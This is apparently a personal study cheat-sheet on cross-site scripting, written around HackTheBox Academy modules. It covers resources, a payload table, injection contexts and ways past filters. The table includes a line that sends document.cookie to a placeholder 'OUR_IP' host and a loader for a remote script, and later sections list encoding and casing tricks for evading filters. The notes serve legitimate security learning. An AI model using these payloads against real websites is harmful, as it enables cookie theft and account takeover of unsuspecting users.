# XSS and CSRF
XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side. Of course these vulnerabilities run entirely within the browser's sandbox and is confined to what the browser can do.

# Resources
- [HTB Cross-Site Scripting (XSS) Module](https://academy.hackthebox.com/module/103/section/965)
- [HTB Advanced XSS and CSRF Exploitation Module](https://academy.hackthebox.com/module/235/section/2653)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Xss](https://portswigger.net/web-security/cross-site-scripting)
- [HackTricks XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html)

# Good Examples
- [Rook to XSS](https://skii.dev/rook-to-xss/?ref=weekly.infosecwriteups.com)
- [MySpace Samy worm](https://en.wikipedia.org/wiki/Samy_(computer_worm))
- [Twitter TweetDeck](https://blog.sucuri.net/2014/06/serious-cross-site-scripting-vulnerability-in-tweetdeck-twitter.html)
- [Google Search XSS](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
- [Apache XSS](https://infra.apache.org/blog/apache_org_04_09_2010)

# Methodology
- [HackTricks](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html#methodology)


# XSS Testing Payloads
| Description | Code |
|-------------|------|
| Check for filtering (See below) | ;:!--''" <SCs>=&{[(`)]}//. |
| Basic XSS Payload | `<marquee>` |
| Basic XSS Payload | `<script>alert(window.origin)</script>` |
| Basic XSS Payload | `<script>alert(1)</script>` |
| Basic XSS Payload that stops rendering the HTML code that comes after it and display it as plaintext.  | `<plaintext>` |
| Basic XSS Payload | `<script>print()</script>` |
| HTML-based XSS Payload | `<img src="" onerror=alert(window.origin)>` |
| Change Background Color | `<script>document.body.style.background = "#141d2b"</script>` |
| Change Background Image | `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` |
| Change Website Title | `<script>document.title = 'HackTheBox Academy'</script>` |
| Overwrite website's main body | `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` |
| Remove certain HTML element | `<script>document.getElementById('urlform').remove();</script>` |
| Load remote script | `<script src="http://OUR_IP/script.js"></script>` |
| Send Cookie details to us | `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` |

# Notes
## Same-Origin Policy (SOP) 
Tries to set boundaries by preventing one origin (website) from accessing resources from another origin. A different origin is defined by something that has a different protocol (`http` vs `https`), domain (`example.com` vs `google.com`) and port (`80` vs `443`)

## Content Security Policy (CSP) 
Also tries to add an additional later that lets websites declare which sources of content are trusted. e.g Without CSP an attacker can injects `<script>steal(document.cookie)</script>`. However, the SOP would limit the damage - the malicious script would only be able to access data from the current origin, not from the user's other tabs. If the CSP blocking inline scripts, that injection would be blocked. 

## Where is the output presenting itself?
Determine where your input is getting printed in the HTTP response we receive back:
- Inside the head or body: Easy, just use your regular HTML tags like `<script>alert(1)</script>` or load an external script `<script src=https://onofri.org/security/xss.js></script>.`
- If you are inside a comment, you have to escape out of the comment: `--><script>alert(1)</script>`
- Same applies to `<textarea>` - we have to escape it first with `</textarea><script>alert(1)</script>`
- If we are inside a HTMl attribute we can try terminate it right before our payload (vector). An attribute can be delimited by single or double quotes or whitespace. Then we close the tag and place our payload e.g `'><script>alert(1)</script>` or `"><script>alert(1)</script>`
- If we can't escape out of an attribute we might be able to abuse it itself: e.g if we are in a `href` or `src` attribute we can use it directly with: `javascript:alert(1)` but each attribute/element might behave a little differently. And `"onmouseover="alert(1)` or  `'onmouseover='alert(1)` are valid for most.
- If we're in JS code it depends where we are in the code, JS comments are `//`, it's line terminator is `;` and of course `'` + `"`
- Markdown XSS is a thing: `[xss[(javascript:alert('1'))`

## When is our input getting processed?
`<script>alert(1)</script>` is triggered on page load. However if our payload loads dynamically, such as `<img src=x onerror-alert(1)>`, this may be advantageous since onerror is triggered dynamically. Which means:
- Harder for security scanners to detect since the malicious code isn't present during initial page analysis :point_left:
- Can bypass some client-side filters that only check content on page load :point_left:
- Often involves content that gets injected into the DOM after the page has already loaded

# XSS Filter Bypasses
Client-side filters are relatively easy to bypass with BurpSuite, Server-side filters like a WAF or integrated into the app vary in effectiveness as it depends largely on their config.

How might these filters be implemented?
- Allow listing (Whitelisting) of allowed elements, attributes or characters.
- Blacklisting of allowed elements, attributes or characters.
- Filters are often layered. A payload may pass one filter but get caught by another
- Input could be truncated after a certain number of characters so worth trying short payloads. Some browsers will let you omit `http` or `https` by using `//` e.g `<script/src=//v.ht/aa`
- HTML is case-sensitive whilst JavaScript is not.
- Authors favourite way to evaluate what characters are encoded or not, as it will help determine which useful characters are permitted, encoded, removed and whether the input is in upper or lowercase:
```
;:!--''" <SCs>=&{[(`)]}//.
```
Weak Blacklists:
- Casing: `<ScRiPt>alert(1);</ScRiPt>`
- Casing: `<object data="JaVaScRiPt:alert(1)">`
- Casing: `<img src=x OnErRoR=alert(1)>`
- No Space allowed: `<svg/onload=alert(1)>`
- If `img` is blocked, try `audio` or `video`
- If `alert` is blocked, try `prompt` or `confirm`
- If parenthesis `()` are blocked, try the back tick `
- To combine the last 3:
```
<audio src onloadstart=confirm`1`>
```
- Partial encoding e.g if the string `javascript:` is blocked, try `j&#X41vascript:`

JavaScript Encodings
- Unicode: `"\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"`
- Octal: `"\141\154\145\162\164\50\61\51"`
- Hex: `"\x61\x6c\x65\x72\x74\x28\x31\x29"`
- Base64: `atob("YWxlcnQoMSk=")`

String Creation
- fromCharCode: `String.fromCharCode(97,108,101,114,116,40,49,41)`
- source: `/alert(1)/.source`
- URL Encoding: `decodeURI(/alert(%22xss%22)/.source)`

Execution Sinks:
- eval: `eval("alert(1)")`
- setTimeout: `setTimeout("alert(1)")`
- setInterval: `setInterval("alert(1)")`
- Function: `Function("alert(1)")()`
- constructor: `[].constructor.constructor(alert(1))()`

---

# HTB Module questions
## Cross-Site Scripting (XSS)
## Advanced XSS and CSRF Exploitation
